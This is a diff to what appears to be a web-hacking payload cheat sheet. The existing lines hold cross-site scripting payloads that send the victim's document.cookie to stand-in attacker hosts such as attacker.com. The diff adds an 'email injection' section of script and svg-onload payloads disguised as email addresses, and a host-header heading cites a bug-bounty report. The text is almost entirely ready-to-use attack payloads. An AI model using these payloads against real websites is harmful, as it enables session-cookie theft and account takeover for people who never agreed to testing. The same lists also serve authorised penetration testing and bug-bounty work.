@@ -70,6 +70,13 @@ SEND DATA YOUR TO YOUR SERVER:
 	<svg onload="(new Image).src='https://your-server.com/log?'+document.cookie">
         <script>fetch('https://attacker.com/c='+document.cookie)</script>
 
+EMAIL INJECTION:
+|
+|_
+    "><script>alert(1)</script>@test.com
+    "><svg/onload=alert(1)>@test.com
+    "><svg/onload=confirm(1337)>"@x.y
+
 
 HOST HEADER ATTACK
 font: https://hackerone.com/reports/2627221
